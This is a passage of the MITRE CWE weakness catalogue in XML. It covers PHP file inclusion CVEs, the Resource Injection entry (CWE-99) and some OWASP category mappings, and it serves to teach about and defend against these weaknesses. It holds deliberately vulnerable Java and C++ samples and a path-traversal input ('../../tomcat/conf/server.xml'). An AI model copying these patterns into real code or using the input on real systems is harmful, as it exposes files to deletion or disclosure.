               <Body_Text>Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-0285</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0030</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0030</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0068</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0068</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2157</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2162</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2162</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2198</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0128</Reference>
               <Description>Modification of assumed-immutable variable in configuration script leads to file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1864</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1869</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1869</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1870</Reference>
               <Description>PHP file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2154</Reference>
               <Description>PHP local file inclusion.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2154</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1704</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1704</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1707</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1707</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1964</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1681</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2086</Reference>
               <Description>PHP remote file include.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2086</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0127</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0127</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1971</Reference>
               <Description>Directory traversal vulnerability in PHP include statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3335</Reference>
               <Description>PHP file inclusion issue, both remote and local; local include uses ".." and "%00" characters as a manipulation, but many remote file inclusion issues probably have this vector.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3335</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1936</Reference>
               <Description>chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1936</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>PHP File Include</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>5</Entry_ID>
               <Entry_Name>Remote File Inclusion</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="193"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-185"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-951"/>
            <Reference External_Reference_ID="REF-952"/>
            <Reference External_Reference_ID="REF-953"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>This is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role.</xhtml:p>
               <xhtml:p>Can overlap directory traversal in local inclusion problems.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Relationship_Notes, Research_Gaps, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>converted from Compound_Element to Weakness</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Name, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">PHP File Inclusion</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Control of Filename for Include/Require Statement in PHP Program (aka 'PHP File Inclusion')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2013-02-21">Improper Control of Filename for Include/Require Statement in PHP Program ('PHP File Inclusion')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="99" Name="Improper Control of Resource Identifiers ('Resource Injection')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.</Description>
         <Extended_Description>
            <xhtml:p>A resource injection issue occurs when the following two conditions are met:</xhtml:p>
               <xhtml:ol>
                  <xhtml:li>An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.</xhtml:li>
                  <xhtml:li>By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.</xhtml:li>
               </xhtml:ol>
            <xhtml:p>This may enable an attacker to access or modify otherwise protected system resources.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="706" View_ID="1000"/>
            <Related_Weakness Nature="CanAlsoBe" CWE_ID="73" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Insecure Direct Object Reference</Term>
               <Description>OWASP uses this term, although it is effectively the same as resource injection.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, it can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as "../../tomcat/conf/server.xml", which causes the application to delete one of its own configuration files.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String rName = request.getParameter("reportName");<xhtml:br/>File rFile = new File("/usr/local/apfr/reports/" + rName);<xhtml:br/>...<xhtml:br/>rFile.delete();</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system.</Intro_Text>
               <Example_Code Nature="Bad" Language="C++">
                  <xhtml:div>ifstream ifs(argv[0]);<xhtml:br/>string s;<xhtml:br/>ifs &gt;&gt; s;<xhtml:br/>cout &lt;&lt; s;</xhtml:div>
               </Example_Code>
               <Body_Text>The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name "path manipulation.") Similarly, data that contains URLs and URIs is risky for functions that create remote connections.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Resource Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-99</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="240"/>
            <Related_Attack_Pattern CAPEC_ID="75"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-99"/>
         </References>
         <Notes>
            <Note Type="Relationship">Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73).</Note>
            <Note Type="Maintenance">The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 "Resource Injection," as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the "identifier used to access a system resource" such as a file name or port number, yet it explicitly states that the "resource injection" term does not apply to "path manipulation," which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>KDM Analytics</Modification_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>KDM Analytics</Modification_Name>
               <Modification_Date>2009-07-17</Modification_Date>
               <Modification_Comment>Improved the White_Box_Definition</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Maintenance_Notes, Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, White_Box_Definitions</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Other_Notes, Potential_Mitigations, References, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Resource Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Control of Resource Identifiers (aka 'Resource Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
   </Weaknesses>
   <Categories>
      <Category ID="1032" Name="OWASP Top Ten 2017 Category A6 - Security Misconfiguration" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A6 category in the OWASP Top Ten 2017.</Summary>
         <Relationships>
            <Has_Member CWE_ID="16" View_ID="1026"/>
            <Has_Member CWE_ID="209" View_ID="1026"/>
            <Has_Member CWE_ID="548" View_ID="1026"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-957"/>
         </References>
         <Notes>
            <Note Type="Relationship">While the OWASP document maps to CWE-2 and CWE-388, these are not appropriate for mapping, as they are high-level categories that are only intended for the Seven Pernicious Kingdoms view (CWE-700).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-01-22</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1035" Name="OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A9 category in the OWASP Top Ten 2017.</Summary>
         <References>
            <Reference External_Reference_ID="REF-957"/>
         </References>
         <Notes>
            <Note Type="Relationship">This is an unusual category. CWE does not cover the limitations of human processes and procedures that cannot be described in terms of a specific technical weakness as resident in the code, architecture, or configuration of the software. Since "known vulnerabilities" can arise from any kind of weakness, it is not possible to map this OWASP category to other CWE entries, since it would effectively require mapping this category to ALL weaknesses.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2018-01-22</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1216" Name="Lockout Mechanism Errors" Status="Draft">
         <Summary>Weaknesses in this category are related to a software system's lockout mechanism. Frequently these deal with scenarios that take effect in case of multiple failed attempts to access a given resource. The weaknesses in this category could lead to a degradation of access to system assets if they are not addressed.</Summary>
         <Relationships>
            <Has_Member CWE_ID="645" View_ID="699"/>
         </Relationships>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2019-12-30</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1345" Name="OWASP Top Ten 2021 Category A01:2021 - Broken Access Control" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A01 category "Broken Access Control" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="22" View_ID="1344"/>
            <Has_Member CWE_ID="23" View_ID="1344"/>
            <Has_Member CWE_ID="35" View_ID="1344"/>
            <Has_Member CWE_ID="59" View_ID="1344"/>
            <Has_Member CWE_ID="200" View_ID="1344"/>
            <Has_Member CWE_ID="201" View_ID="1344"/>
            <Has_Member CWE_ID="219" View_ID="1344"/>
            <Has_Member CWE_ID="264" View_ID="1344"/>
            <Has_Member CWE_ID="275" View_ID="1344"/>
            <Has_Member CWE_ID="276" View_ID="1344"/>
            <Has_Member CWE_ID="284" View_ID="1344"/>
            <Has_Member CWE_ID="285" View_ID="1344"/>
            <Has_Member CWE_ID="352" View_ID="1344"/>
            <Has_Member CWE_ID="359" View_ID="1344"/>
            <Has_Member CWE_ID="377" View_ID="1344"/>
            <Has_Member CWE_ID="402" View_ID="1344"/>
            <Has_Member CWE_ID="425" View_ID="1344"/>
            <Has_Member CWE_ID="441" View_ID="1344"/>
            <Has_Member CWE_ID="497" View_ID="1344"/>
            <Has_Member CWE_ID="538" View_ID="1344"/>
            <Has_Member CWE_ID="540" View_ID="1344"/>
            <Has_Member CWE_ID="548" View_ID="1344"/>
            <Has_Member CWE_ID="552" View_ID="1344"/>
